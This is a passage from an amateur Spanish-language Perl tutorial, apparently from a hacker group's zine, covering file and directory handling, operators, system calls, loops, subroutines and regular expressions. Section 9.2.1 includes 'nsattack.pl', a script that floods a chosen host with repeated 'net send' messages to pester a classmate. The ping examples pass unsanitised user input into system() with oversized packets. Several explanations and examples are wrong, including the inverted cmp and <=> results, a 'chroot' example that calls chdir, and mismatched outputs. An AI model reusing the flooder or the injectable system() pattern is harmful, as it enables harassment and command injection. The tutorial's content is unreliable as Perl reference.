- read, leyendo solo unas pocas lineas -

  Ejemplo:
   #!/usr/bin/perl
   open (ARCHIVO, "archivo.txt");
   $caracteres = 10;   #toma 10 caracteres del archivo
   read (ARCHIVO, $cadena, $caracteres); #los lee
   print $cadena, "\n";        #los imprime


  SALIDA:

   [root@localhost articulo]# perl read.pl
   ewwwtttttt






.==========================================================================.
|=======~ 6.1.1 ABRIR ARCHIVOS - SYSOPEN ~==================================
|===========================================================================


- sysopen se parece bastante a la funcion open salvo que es posible  cambiar
  una serie de parametros como los permisos del archivo etc, su sintaxis es:

   sysopen (REFERENCIA, "archivo que abrimos", MODO DE APERTURA, PERMISOS)


* El modo de apertura puede ser:

   O_RDONLY : Solo lectura
   O_WRONLY : Solo escritura
   O_CREAT  : Crea el archivo si no existe
   O_TRUNC  : Trunca el archivo antes de leerlo o escribirlo
   O_RDWR   : Escritura y lectura


* Para usar varios modos a la vez usaremos pipes |


  Ejemplo::

   * Crear un archivo si no existe y escribe en el

       #!/usr/bin/perl
       sysopen (ARCHIVO, "archivo.txt", O_WRONLY | O_CREAT);



* Para cambiar permisos, por defecto les da 666

  Ejemplo:

   #!/usr/bin/perl
   sysopen (ARCHIVO, "archivo.txt", O_WRONLY | O_CREAT,0666);






.==========================================================================.
|=======~ 6.2.0 CERRAR ARCHIVOS ~===========================================
|===========================================================================


- Para cerrar archivos se usa la funcion close, su sintasis es:

  Ejemplo:

   close (ARCHIVO);


* ARCHIVO es la etiqueta que le hemos asignado antes.






.==========================================================================.
|=======~ 6.3.0 ABRIR UN PROCESO ~==========================================
|===========================================================================


- Se abren de forma  muy parecida a los archivos pero con |,  se puede abrir
  cualquier proceso por ej para enviar correo:

open(CORREO, "|/usr/sbin/sendmail");


Un  ejemplo con un simple  dir:

  Ejemplo:

   #!/usr/bin/perl
   open(LISTAR, "|dir");
   $listado = (<LISTAR>);
   print $listado;
   close $listado;

  SALIDA:

   [root@localhost articulo]# perl listar.pl
   ddiego.txt  diego2.pl  listado  listar.pl
   [root@localhost articulo]#






.==========================================================================.
|=======~ 6.4.0 CERRAR UN PROCESO ~=========================================
|===========================================================================


- Se cierra de la misma forma que los archivos con close:

  Ejemplo:

   close (CORREO);






.==========================================================================.
|=======~ 6.5.0  DIRECTORIOS ~==============================================
|===========================================================================


- Vamos a ver como abrir,  cerrar y gestionar  directorios  facilmente y con
  ejemplos.






.==========================================================================.
|=======~ 6.5.1 ABRIR Y CERRAR DIRECTORIOS ~================================
|===========================================================================


- Usaremos la funcion opendir para abrir y cerrar directorios,  de la misma
  forma que lo haciamos con ficheros.

  Ejemplo:

   #!/usr/bin/perl
   opendir (DIRECTORIO, "/"); #abre /, si pones un . ira al directorio
                              #donde este el programa

   foreach $nombre (readdir(DIRECTORIO)) #con foreach ordenaremos el listado
                                         #ver apartado 9.4 luego lee /  y lo
                                         #guarda en $nombre
   {
    print "$nombre\n";    #imprime $nombre
   }
   closedir(DIRECTORIO);  #cierra


  SALIDA:

   [root@localhost articulo]# perl abrirdir.pl
   .
   ..
   mnt
   home
   dev
   etc
   tmp
   var
   root
   boot
   proc
   sbin
   usr
   lib
   bin
   opt
   .mozilla
   lost+found


- Como cambiar el directorio con el que estamos trabajando,  pues con chdir:
  SINTAXIS: chdir directorio.



  Ejemplo:

   #!/usr/bin/perl
   $raiz= "/iuuii";
   $directorio= chdir $raiz;
   print "$directorio\n";


  SALIDA:

  * Imprime 0 porque no existe ese directorio /iuuii

   [root@localhost articulo]# perl chdir.pl
   0


* pero si pusieramos $raiz="/";

   Saldria 1, la operacion a tenido exito



- Hay otra forma de cambiar, de directorio con chroot se diferencia de chdir
  en que una vez cambiado de directorio no podemos movernos de este,  chroot
  funciona de la misma manera:

  Ejemplo:

   #!/usr/bin/perl
   $raiz= "/";
   $directorio= chdir $raiz;
   print "$directorio\n";


  SALIDA:

   1






.==========================================================================.
|=======~ 6.5.2 GESTIONAR DIRECTORIOS ~=====================================
|===========================================================================


- Ver el direcorio en que nos encontramos -

  Usaremos el modulo Cwd que viene el la biblioteca estandar de perl, podeis
  adelantaros un poco y mirar el capitulo 24.0 en el que  explica que  es un
  modulo, y como se usa, es poco no os preocupeis:



  Ejemplo:

   #!/usr/bin/perl
   use Cwd;  #Usamos el modulo
   print getcwd(), "\n";  #devuelve el directorio en que estoy


  SALIDA:

   [root@localhost articulo]# perl getcwd.pl
   /home/ddiego/programacion/perl/articulo



- Crear directios usaremos  mkdir directorio permisos:

  Ejemplo:

   #!/usr/bin/perl
   print "que directorio creamos: ";
   $directorio=<STDIN>;
   mkdir $directorio, 755; #permisos



- Borrar directorios:

  Ejemplo:

   #!/usr/bin/perl
   print "que directorio borramos: ";
   $directorio=<STDIN>;
   rmdir $directorio;






.==========================================================================.
|=======~ 7.0.0 OPERADORES ~================================================
|===========================================================================


 +     Suma
 -     Resta
 *     Multiplicacion
 /     Division
 %     Modulacion
 &     AND,  a nivel de bits
 |     OR, a nivel de bits
 &&    AND, y logico
 ||    OR logico
 ,     Separador de comas
 ..    Operadore de rango de lista
 **    Exponenciacion (el valor de la izq se eleva a la potencia de la derecha)
 =~    Coincidencia de patrones (comprueba si los elementos son verdaderos)
 ¡~    Coincidencia de patrones (comprueba si los elementos son falsos)
 << >> Operadores de esplazamiento
 ?and: Operador condicional "juntos"
 ++ Autoincremento
 -- Autodecremento



- OPERADORES DE COMPARACION DE CADENAS -

 gt    Mayor que
 lt    Menor que
 eq    Igual a
 le    Menor o igual que
 ge    Mayor o igual que
 ne    Distinto a
 cmp   Retorno de comparacion ejemplo:

 $abecedario= "a" cmp "d" Como resultado es 1 porque d es mayor que a
 $abecedario= "d" cmp "a" Como resultado es -1 porque d es mayor que a
 $abecedario= "d" cmp "d" Como resultado es 0 porque d es igual que d






- OPERADORES DE COMPARACION NUMERICOS -

 >     Mayor que
 <     Menor que
 ==    Igual a  " comparando es distinto a = que es asignacion "
 <=    Menor o igual a
 >=    Mayor o igual a
 !=    Distinto a
 <=>   Retorno de comparacion, veremos un ej:

 $numero <=> 50 : - A 0 si $numero y 5 son iguales
                  - A 1 si $numero es menor que 50
                  - A -1 sin $numero es mayor que 50




- Secuencias de escape -

- Veremos que todas tienen una barra invertida \, y segun el caracter que
  tenga detras ejecutara una accion.


 \a   Pitido
 \b   Retroceso
 \e   Escape
 \E   Acaba con \Q, \L y \U
 \f   Salto de pagina
 \l   El siguiente caracter estara en minuscula
 \L   Todos los siguientes caracteres estaran en mayusculas
 \n   Linea nueva
 \Q   Introduce una barra inversa en trosos los caracteres siguientes no alfanumericos
 \r   Retorno de carro
 \t   Tabulador
 \u   El siguiente caracter estara en mayuscula
 \U   Todos los siguientes caracteres estaran en mayuscula
 \v   Tabulador vertical
 \007 Caracter de timbre en octal
 \x07 Caracter de timbre en hexadecimal
 \cC  Ctrl+C



* Si ponemos un

  Ejemplo:

   #!/usr/bin/perl
   print "hola\n\a";


* Al final de imprimir la cadena hola sonara un pitido





- Operador coma -

- Si asignasemos en una cadena por  ej varios valores de esta manera:

  Ejemplo:

   #!/usr/bin/perl
   $miembros = ("DDiego,W3ndig0,S-P-A-R-K"); #$miembros toma  el valor que
                                             #este mas a la derecha
   print "$miembros\n"; #imprimira en pantalla S-P-A-R-K



  SALIDA:

   [root@localhost articulo]# perl coma.pl
   S-P-A-R-K

* En vez de una coma se puede usar  tambien el operador =>



- Jugando con los operadores de desplazamiento << -

- A veces quieres meter mucho texto y usar las comillas y  print a cada poco
  da brasa,  por eso podemos usar algun  truquillo,  y tendremos que usar el
  operador <<.

  Ejemplo:

   #!/usr/bin/perl
   print <<'final'; #la sintaxis es: print <<'nombrequequieras';
   hola che
   hola man
   hola jarto
   final            #aqui llega el final, si lees code giri EOF suele ser la
                    #marca que usan



  SALIDA:

   [root@localhost articulo]# perl <<.pl
   hola che
   hola man
   hola jarto


- Se puede monstrar la cadena tantas veces como quieras:

  Ejemplo:

   #!/usr/bin/perl
   print <<'EOF' x 10;   #dices que la repita 10 veces
   hola che
   EOF


  SALIDA:

   [root@localhost articulo]$ perl repite.pl
   hola che
   hola che
   hola che
   hola che
   hola che
   hola che
   hola che
   hola che
   hola che
   hola che







.==========================================================================.
|=======~ 8.0.0 LLAMADAS AL SISTEMA ~=======================================
|===========================================================================


- 1º veremos system,  nos ayudara a usar otros programas de manera facil,  y
  luego exec ya veremos las diferencia de cada uno:


  Ejemplo:

   #!/usr/bin/perl
   system("dir");


 * La salida sera la lista de directorios.


 - Si queremos que la salida la redireccione a un archivo pondremos:

  Ejemplo:

   #!/usr/bin/perl
   system("dir > archivo.txt");


- Luego esta exec, que sirve para lo mismo pero se diferencia en que en sys-
  tem que al ejecutar esa orden no se sale del programa pero con exec si,con
  exec se sale de el script de perl para ejecutar el programa que hayas man-
  dado, vamos a ver como es esto:


  Ejemplo:

   #!/usr/bin/perl
   system("dir");
   print "hola\n";


  SALIDA:

   [root@localhost articulo]# perl system.pl
   ddiego.txt  diego.pl  prueba  system.pl
   hola

* Vemos como sigue sin problemas a la siguiente instruccion



- umm vamos a hacer un pequeño programeta para enviar unos cuantos pings:


  Ejemplo:

   #!/usr/bin/perl
   print "Cual es la ip ?? ";
   $ip= <STDIN>;
   print "Ping to $ip\n";
   system("ping -s 65500 $ip");


* Y si fuera  en win:

  Ejemplo:

   #!/usr/bin/perl
   print "Cual es la ip ?? ";
   $ip= <STDIN>;
   print "Ping to $ip\n";
   system("ping -t -l 65500 $ip");



- Ahora  veremos con exec:

  Ejemplo:

   #!/usr/bin/perl
   exec("dir");
   print "hola\n";


  SALIDA:

   [root@localhost articulo]# perl exec.pl
   ddiego.txt  diego.pl  prueba  exec.pl

* Como vemos no imprime hola porque se salio del nuestro programa, para eje-
  cutar dir.



- Tambien hay mas formas de usar system, la salida seria la misma:

  Ejemplo:

   #!/usr/bin/perl
   system ("ls","/");


  SALIDA:

   [root@localhost fork]# perl system.pl
   bin  boot  dev  etc  home  lib  mnt  opt  proc  root  sbin  tmp  usr  var



- Limpiar pantalla -

* Para ello usaremos system y clear, de esta forma:

  Ejemplo:

   #!/usr/bin/perl
   system ("clear");



- Dios como meto la salida de system en una variable -

* La respuesta en sencilla sin system :D, veamos como:

  Ejemplo:
   #!/usr/bin/perl
   $salida= `dir /`;
   print "$salida\n";


  SALIDA:

   [root@localhost arti]# perl sinsystem.pl
   bin  boot  dev  etc  home  lib  mnt  opt  proc  root  sbin  tmp  usr  var







.==========================================================================.
|=======~ 9.0.0  BUCLES ~===================================================
|===========================================================================


- Cuando queremos  que una determinada sentencia se produzca varias veces, o
  que segun que condiciones el programa realize una accion u otra, es cuando
  el programador echa mano del bucle.






.==========================================================================.
|=======~ 9.1.0 BUCLE WHILE ~===============================================
|===========================================================================


- Para este se usa la sentencia "while", y el  programa ejecutara una accion
  mientras siga existiendo una condicion


  SINTAXIS:

   while (condicion)
   {
      (ejecucion de una accion)
   }



  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   while ($numero<=10)  #Mientras $numero sea menor o igual que 10
   {
    print "hola\n\a";    #Imprimir esta cadena
    $numero++;           #Inrementa 1 cada vez que se repite
   }


  SALIDA:

   [root@localhost articulo]# perl while.pl
   hola
   hola
   hola
   hola
   hola
   hola
   hola
   hola
   hola
   hola



- Podemos hacer que se incremente de 2 en 2, de 3 en 3 o como queramos:



  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   while ($numero<=10)  #Mientras $numero sea menor o igual que 10
   {
    print "hola\n\a";    #Imprimir esta cadena
    $numero=$numero+2;  #Incrementa 2 cada vez que se repite  otra  forma
                        #seria $numero+=2;
    }



  SALIDA:

   [root@localhost articulo]# perl masincremento.pl
   hola
   hola
   hola
   hola
   hola



- Si no sigue la condicion o si la condicion es falsa podemos usar until,por
  ejemplo en el programa anterior:


  Ejemplo:

   #!/usr/bin/perl
   $numero=11;
   while ($numero<=10)  #Mientras $numero sea menor o igual que 10
   {
    print "hola\n";    #Imprimir esta cadena
    $numero++;           #Inrementa 1 cada vez que se repite
   }
    until($numero>10)
   {
    print "adios\n";
   }



- Vamos  a  ver la  instruccion  do que hace que  se  ejecute  un  bloque de
  codigo


  Ejemplo:

   #!/usr/bin/perl
   $numero=11;
   while ($numero<=10)  #Mientras $numero sea menor o igual que 10
   {
    do {
        print "hola\n"; #Imprimir esta cadena
        $numero++;      #Inrementa 1 cada vez que se repite
       }
   }
    until($numero>10)
   {
     print "adios\n";
   }



- Es frecuente encontrar continue para continuar el bucle -

  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   while ($numero<=10)#Mientras $numero sea menor o igual que 10
   {
    print "hola\n\a"; #Imprimir esta cadena
    $numero=$numero+2;#Incrementa 2 cada vez que se repite  otra  forma
                      #seria $numero+=2;
   } continue {
               print "continua $numero\n";
              }







.==========================================================================.
|=======~ 9.2.0 BUCLE FOR ~=================================================
|===========================================================================


- Con "for" podemos establecer la variable y hacer todo lo anterior de forma
  seguida:


 SINTAXIS: for (valor de variable; condicion; expresion de control)


  Ejemplo:

   #!/usr/bin/perl
   for ($numero=1;$numero<=10;$numero++)
   {
    print "hola\n\a";
   }


- Algo mas dificil, varias variables, condiciones y expresiones de control:

for (valor de variable, valor de variable;condicion, condicion; expresion de
      control, expresion de control)


  Ejemplo:

   #!/usr/bin/perl
   for ($numero1=1,$numero2=10;$numero1<=10,$numero2<=20;$numero1++,$numero2++)
   {
    print "$numero1\n";
    print "$numero2\n";
   }


  SALIDA:

   1
   10
   2
   11
   3
   12
   4
   13
   5
   14
   6
   15
   7
   16
   8
   17
   9
   18
   10
   19
   11
   20





- NEXT -


- Si por ejemplo queremos saltarnos una parte del bucle usaremos next:


  Ejemplo:

   #!/usr/bin/perl
   for ($numero=1;$numero<=10;$numero++)
   {
     if ($numero==5)    #Cuando llegue a 5
     {
       next;             #pasar al siguiente
     }
     print "$numero\n";
   }


  SALIDA:

   [root@localhost articulo]# perl next.pl
   1
   2
   3
   4
   6
   7
   8
   9
   10



- LAST -

* Con last hace que el bucle finalice llegando al final:


  Ejemplo:
   #!/usr/bin/perl
   for ($numero=1;$numero<=10;$numero++)
   {
      if ($numero==5)    #Cuando llegue a 5
      {
       last;             #acabar con el bucle
      }
      print "$numero\n";
   }


  SALIDA:

   [root@localhost articulo]# perl last.pl
   1
   2
   3
   4



- REDO -

* Con redo vuelve a iniciar el bucle

  Ejemplo:
   #!/usr/bin/perl
   for ($numero=1;$numero<=10;$numero++)
   {
     if ($numero==5)    #Cuando llegue a 5
     {
      redo;             #vuelve a iniciar con el bucle
     }
     print "$numero\n";
   }



-  Un bucle infinito -

* Vamos a usar for para realizar un bucle infinito:

  Ejemplo:

   #!/usr/bin/perl
   for(;;)
         {
           print "hola\n";
         }






.==========================================================================.
|=======~ 9.2.1 JUGANDO CON NET SEND ~======================================
|===========================================================================


- El otro dia en clase usando "net send" para enviar mensajes emergentes, un
  compañero no paraba de enviarme muchos mensajes seguidos tocando los  hue-
  vos, y se me paso por la cabeza una maldad,  para enviarle yo tambien unos
  pocos mensajes, vamos a crear un pequeño programa que automatice el envio,
  vamos a ver como se hace y que facil es:


<++> nsattack.pl

 #!usr/bin/perl
 print "-----------------------------------\n";
 print "     Netsend attack by DDiego      \n";
 print "          VERSION BETA             \n";
 print "     D  I  S  I  D  E  N  T  S     \n";
 print " L O S  F U E R A  D E  L A  L E Y \n";
 print "-----------------------------------\n";
 print "Para salir del programa presione ALT+C\n";
 print "Cuantos mensajes enviamos hoy ;)?? ";
 $numero = <STDIN>;
 print "Introduce 'nombre de equipo o host': ";
 $equipo = <STDIN>;
 print "Introduce el mensaje caliente: ";
 $mensaje = <STDIN>;
 for($a=1;$a<=$numero;$a++)
 {
 system ("net send $equipo $mensaje");
 }
 print "Que  divertido solo $numero enviados\n";
 print " ----------------------------------------- \n";
 print " MAIL:       ddiegodisid\@yahoo.es          \n";
 print " MAIL TEAM:  disidents\@yahoo.es            \n";
 print " WEB TEAM : http://disidents.int-ltd.com   \n";
 print " ----------------------------------------- \n";


 # Saludos a todo el team Spark, W3ndig0, rootzero, Rah3,^jan, X4B1,
 # Vanmore y a todo disidents, tambien a Genl0g  etc etc etc etc

<-->


- Veamos, el programa es muy sencillo, solo se trata de repetir cierto nume-
  ro de veces esto en la consola:   net send "nombre de equipo o ip" mensaje


 print "Para salir del programa presione ALT+C\n";
 print "Cuantos mensajes enviamos hoy ;)?? ";
 $numero = <STDIN>;  #Aqui introduces el numero de mensajes a enviar y
                     #pueden ser muchos ;)
 print "Introduce 'nombre de equipo o ip': "; #Aqui pide el nombre de equipo
                                              #o ip

 $equipo = <STDIN>;                           #Recoge el nombre de equipo
 print "Introduce el mensaje caliente: ";     #Pide el mensaje
 $mensaje = <STDIN>;                          #Recoge el mensaje que hayas
                                              #introducido en el teclado

 for($a=1;$a<=$numero;$a++)                   #Para $a=1 y hasta que $a sea
                                              #menor = que el numero
                                              #introducido
 {
 system ("net send $equipo $mensaje");        #Repetira  $mensaje "el
                                              #mensaje que has metido
 }
 print "Que  divertido solo $numero enviados\n"; #Un pequeño mensaje
                                                 #al final de despedida



- Bueno este programa es un poco para que veais se pueden automatizar muchas
  aplicaciones con los bucles, no lo useis mucho que caeria de pesao.






.==========================================================================.
|=======~ 9.3.0 CONDICION CON IF ~==========================================
|===========================================================================


- Este se usara,para que si se cumple una condicion se ejecute una sentencia
  ,veamos como funciona:


  SINTAXIS:

   if (condicion)
                 {
                  (sentencia o accion)
                 }


* Luego si no se cumple esa condicion que ha impuesto, la sentencia if usara
  la sentencia else:


  SINTAXIS:

   else
       {
         (sentencia o accion)
       }


  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   print("Introduce un numero: ");
   $introduce = <STDIN>;
   if ($introduce==$numero)#compara el numero introducido $introduce con
                           #$numero
   {
    print "Has acertado el numero \n";
   }
   else
   {
    print "Has perdido el numero era el $numero\n";
   }



  SALIDA:

   [root@localhost articulo]# perl ifelse.pl
   Introduce un numero: 3
   Has perdido el numero era el 1



* Otra  forma de poner esta expresion es:

  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   print("Introduce un numero: ");
   $introduce = <STDIN>;
   print "Has acertado el numero \n" if ($introduce==$numero);





- Tambien existe la sentencia elsif, que esta situada despues de if, y sirve
  para ejecutar una condicion, si se ha comprobado que la  sentencia  if  es
  falsa:

  Ejemplo:

   #!/usr/bin/perl
   print("Introduce un numero: ");
   $introduce = <STDIN>;
   if (($introduce>=0) && ($introduce <= 10))
   {
    print "Has introducido un numero entre 10 y 0\n";
   }
   elsif (($introduce > 10) && ($introduce <=20))  #si el numero que has
                                                   #introducido es mayor que
   {                                               #10 y menor igual que 20

    print " Has introducido un numero entre 20 y 10\n";
   }
    else
   {
    print "Has introducido un numero mayor de 20\n"; #Si no se cumplen las
                                                     #demas sentencias va a
                                                     #else, esta sentencia
                                                     #es la final
   }


  SALIDA:

   [root@localhost articulo]# perl adivina.pl
   Introduce un numero: 10
   Has introducido un numero entre 10 y 0

   [root@localhost articulo]# perl adivina.pl
   Introduce un numero: 11
   Has introducido un numero entre 20 y 10

   [root@localhost articulo]# perl adivina.pl
   Introduce un numero: 20
   Has introducido un numero entre 20 y 10

   [root@localhost articulo]# perl adivina.pl
   Introduce un numero: 21
   Has introducido un numero mayor de 20






.==========================================================================.
|=======~ 9.3.1 CONDICION ?: ~==============================================
|===========================================================================


- Veamos otro tipo de condiciones,que quizas encontreis en algun programa es
  usando el operador ?:

  Ejemplo:

   #!/usr/bin/perl
   $true="Soy de Disidents";  #valor verdadero
   $false="No soy de Disidents"; #falso
   print "Eres de Disidents? ";
   chop ($respuesta=(<STDIN>)); #quitamos el enter
   $final = ($respuesta eq "si") ? $true : $false;
   print "$final\n";


  SALIDA:

   [root@localhost articulo]# perl condicion.pl
   Eres de Disidents? si
   Soy de Disidents

   [root@localhost articulo]# perl condicion.pl
   Eres de Disidents? n
   No soy de Disidents






.==========================================================================.
|=======~ 9.4.0 FOREACH ~===================================================
|===========================================================================


- Si  queremos  que repita el nº de elementos de un array o arreglo usaremos
  foreach:


  Ejemplo:

   #!/usr/bin/perl
   @nombres = ("Pepe", "Juan", "Francisco");
   print "En el equipo estan:  \n";
   foreach $equipo (@nombres)
   {
    print $equipo, "\n";
   }



  SALIDA:

   [root@localhost articulo]# perl foreach.pl
   En el equipo estan:
   Pepe
   Juan
   Francisco


- Si queremos que nos lo ordene usaremos sort

  Ejemplo:

   #!/usr/bin/perl
   @nombres = (Pepe, Juan, Francisco);
   print "En el equipo estan:  \n";
   foreach $equipo (sort @nombres)
   {
    print "$equipo \n";
   }


  SALIDA:

   [root@localhost articulo]# perl ordenado.pl
   En el equipo estan:
   Francisco
   Juan
   Pepe



* Aunque sort se puede usar directamente en el array:

  Ejemplo:

   #!/usr/bin/perl
   @nombres = (Pepe, Juan, Francisco);
   @nombres= sort @nombres ;
   print "En el equipo estan: @nombres \n";


  SALIDA:

   [root@localhost articulo]# perl sort2.pl
   En el equipo estan: Francisco Juan Pepe


- Tambien podemos hacer  que aparezcan en orden invertido con reverse, de la
  misma manera que usamos sort:

  Ejemplo:

   #!/usr/bin/perl
   @nombres = (Pepe, Juan, Francisco);
   print "En el equipo estan:  \n";
   foreach $equipo (reverse @nombres)
   {
    print "$equipo \n";
   }

  SALIDA:

   [root@localhost articulo]# perl reverse1.pl
   En el equipo estan:
   Francisco
   Juan
   Pepe

* Lo mismo con los arrays directamente @nombres= reverse @nombres






.==========================================================================.
|=======~ 10.0.0 VARIABLES ESPECIALES ~=====================================
|===========================================================================


- Veremos $_ mucho por perl, esta vatiable almacena la ultima linea o ultima
  variable introducida.



  Ejemplo:

   #!/usr/bin/perl
   open(texto, "diego.txt");  #abre diego.txt
   while ($_=<texto>)
   {
    print;        #imprime   $_
   }
    close (texto);


- Tambien podemos ver las variables  $` $' y $&  que pueden guardar parte de
  una variable:


  Ejemplo:

   #!/usr/bin/perl
   $_ = "Hola que tal tienes sed";  #damos a $_ el valor de hola que tal
                                    #tienes sed
   /tal/; #Parte intermedia $& , osea tal
   print "$` \n"; # "Hola que"  toma la parte que esta a la izquierda de tal
   print "$& \n"; # "tal"         toma la parte intermedia "tal"
   print "$'  \n"; # "tienes sed" toma la parte que esta a la derecha de tal
   print "$`$&$'\n"; # Hola que tal tienes sed


  SALIDA:

   [root@localhost articulo]# perl +variables.pl
   Hola que
   tal
    tienes sed
   Hola que tal tienes sed



* Tambien podemos ver @_ en este caso es un arreglo muy especial


  Ejemplo:

   #!/usr/bin/perl
   sub miembros
              {
               print "disidents: @_ \n";
              }
   &miembros ("leon01","w3n","S-P-A-R-K");


  SALIDA:

   [root@localhost articulo]# perl arregloespecial.pl
   disidents: leon01 w3n S-P-A-R-K

* En el caso anterior  $_[0]="leon01"
                       $_[1]="w3n"
                       $_[2]="S-P-A-R-K"







.==========================================================================.
|=======~ 11.0.0 SUBRUTINAS ~===============================================
|===========================================================================


- Las subrutinas son trozos de codigo que ocupan parte de un programa,  y se
  puede llamar desde cualquier parte del programa,  para que se ejecute  esa
  parte del codigo.


  SINTAXIS:

   sub nombredesubrutina
                        {
                         sentencia
                        }


* Y para llamarla y que se cumpla la sentencia se usa &nombredesubrutina



  Ejemplo:

   #!/usr/bin/perl
   print "Hola\n";
   sub misubrutina
   {
        @nombres = (Pepe, Juan, Francisco);
        print "En el equipo estan:  \n";
        foreach $equipo (sort @nombres)
        {
        print "$equipo \n";
        }
   }

   &misubrutina;    #llamamos a la subrutina
   print "adios\n";



  SALIDA:

   [root@localhost articulo]# perl sub1.pl
   Hola
   En el equipo estan:
   Francisco
   Juan
   Pepe
   adios




- Vamos a ver otra forma de llamar a una subrutina,  dandole el valor de una
  variable, son las llamadas "subrutinas anonimas":


  Ejemplo:

   #!/usr/bin/perl
   $subrutina = sub { print "hola man\n" };
   &$subrutina;


  SALIDA:

   [root@localhost articulo]# perl subanonima.pl
   hola man




- Subrutinas autoload -

- Existen un tipo de subrutinas que se ejecutan de forma automatica,  cuando
  existe una llamada a una subrutina que no existe veamos un ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   sub  AUTOLOAD  #nombramos a esta subrutina AUTOLOAD
   {
    print "hola\n"; #cuando se ejecuta esta subrutina imprimira hola
   }
   &ddiego  #hacemos llamada a una subrutina que no existe, y ejecutara la
            #subrutina AUTOLOAD


  SALIDA:

   [root@localhost articulo]# perl autoload.pl
   hola



- Mas formas de llamar a una subrutina:

  Ejemplo:

   #!/usr/bin/perl
   print "Hola\n";
   sub misubrutina
   {
        @nombres = (Pepe, Juan, Francisco);
        print "En el equipo estan:  \n";
        foreach $equipo (sort @nombres)
        {
        print "$equipo \n";
        }
   }

   misubrutina();    #llamamos a la subrutina   de otra  forma
   print "adios\n";



  SALIDA:

   root@localhost articulo]# perl masformas.pl
   Hola
   En el equipo estan:
   Francisco
   Juan
   Pepe
   adios



- Tambien se puede usar en mas cosas:

   do &subrutina;
   require &subrutina;






.==========================================================================.
|=======~ 12.0.0 JUGANDO CON EL TEXTO ~=====================================
|===========================================================================


- ENCONTRAR PALABRAS -

- Para buscar texto o una palabra en un documento por ejemplo usaremos la  /
  de esta  manera:


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~/que/)     #si dentro de $texto hay un "que"
        {
        print "que esta en la frase\n"; #imprime en pantalla
        }
   else                  #si no esta
   {
    print "que no esta en la frase\n";      #imprime esto en pantalla
   }



  SALIDA:

   [root@localhost articulo]# perl buscando.pl
   que esta en la frase

* Existe otra manera  que es usando m de match para buscar texto:

  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~ m/que/)          #si dentro de $texto hay un "que"
        {
        print "que esta en la frase\n"; #imprime en pantalla
        }
   else     #si no esta
   {
    print "que no esta en la frase\n"; #imprime esto en pantalla
   }


  SALIDA:

   [root@localhost articulo]# perl match.pl
   que esta en la frase


- Que queremos hacer dos busquedas,  pues  solo  tenemos que usar un  pipe |
  significa or, (si uno de los dos esta en el texto).


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if(($texto=~/que|tal/))  #si dentro de $texto hay un "que"  o un "tal"
        {
           print "que o tal estan en la frase\n"; #imprime en pantalla
        }
   else   #si no esta
   {
     print "que o tal no estan en la frase\n";   #imprime esto en pantalla
   }


- Ahora  queremos  que  busque  un  texto  pero que no diferencie si esta en
  mayusculas  o minusculas  para ello podriamos algo asi, por ejemplo en  el
  caso anterior:

  Ejemplo:

    if(($texto=~/que|tal/i))  #usamos  el modificador /i






- Ahora vamos a contar el numero de caracteres hasta  llegar  a  una cadena,
  gracias a pos:


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   $texto=~/que/g;
   print  pos($texto),"\n";


* Hasta llegar a que lee 8 caracteres Hola que 4 de "Hola" + 1 de un espacio
  + 3 de el el "que" :


  SALIDA:

   [root@localhost articulo]# perl pos.pl
   8






- SUSTITUIR TEXTO -

* Ahora supongamos que queremos sustituir una palabra o una frase:


  Ejemplo:

  #!/usr/bin/perl
  $texto="Hola que tal estas";
  if($texto=~s/Hola que tal estas/Como te van las cosas?/)  #SE PONE UNA s
                                                            #detras de =~
  {
   print "$texto\n";
  }


  SALIDA:

   [root@localhost articulo]# perl sustituye.pl
   Como te van las cosas?


* Si usamos $_ , no necesitariamos =~

  Ejemplo:

   #!/usr/bin/perl
   $_="Hola que tal estas";
   s/Hola que tal estas/Como te van las cosas?/;
   {
    print "$_\n";
   }


- Otra forma de sustituir es usando llaves { } en vez las / quedaria asi
  if($texto=~s{Hola que tal estas}{Como te van las cosas?})


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~s{Hola que tal estas}{Como te van las cosas?})
   {
    print "$texto\n";
   }


  SALIDA:

   [root@localhost articulo]# perl llaves.pl
   Como te van las cosas?







- Tambien es posible en vez usar /  en s/Hola que tal estas/Como te van  las
  cosas?/), usar otro caracter por ej # ^ lo que quieras, quedaria   de esta
  manera if($texto=~s#Hola que tal estas#Como te van las cosas?#)


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~s^Hola que tal estas^Como te van las cosas?^)
   {
    print "$texto\n";
   }


   SALIDA:

    [root@localhost articulo]# perl masformas.pl
    Como te van las cosas?






- TIPOS DE CARACTERES -

 \d    digitos  [0-9]
 \D    no digitos
 \r    retorno de carro
 \s    espacio en blanco y un salto de linea \n
 \S    no hay ningun  espacio en blanco \t y un salto de linea \n
 \w    un caracter alfanumerico incluido el simbolo _,  [a-zA-Z_]
 \W    no caracteres alfanumericos incluido _, [^a-zA-Z_]


 Cualquier caracter de la "a" a la "z"   [a-z]
 Cualquier caracter de  la "a" a la "z" ya sea mayuscula o minuscula [a-zA-Z]



- COMO CONVERTIR UN ARRAY EN MAYUSCULAS O MINUSCULAS -

- Para pasarlo a mayusculas usaremos map y uc

  Ejemplo:

   #!/usr/bin/perl
   @frase = 'hola loco' ;
   @mayusculas =  map   uc($_), @frase;
   print "@mayusculas\n";


* map hace que podamos aplicar una expresion a una lista o array en este ca-
  so uc para poner@frase en mayusculas:


  SALIDA

   [root@localhost articulo]# perl uc.pl
   HOLA LOCO




- Para solo poner el primer  caracter  de  la cadena  en mayusculas usaremos
  ucfirst:

  Ejemplo:

   #!/usr/bin/perl
   @frase = 'hola loco' ;
   @mayusculas =  map   ucfirst($_), @frase;
   print "@mayusculas\n";


  SALIDA:

   [root@localhost articulo]# perl ucfirst.pl
   Hola loco





- Para convertirlo en minusculas usaremos map y lc:

  Ejemplo:

   #!/usr/bin/perl
   @frase = 'HOLA LOCO' ;
   @minusculas =  map   lc($_), @frase;
   print "@minusculas\n";


  SALIDA:

   [root@localhost articulo]# perl lc.pl
   hola loco



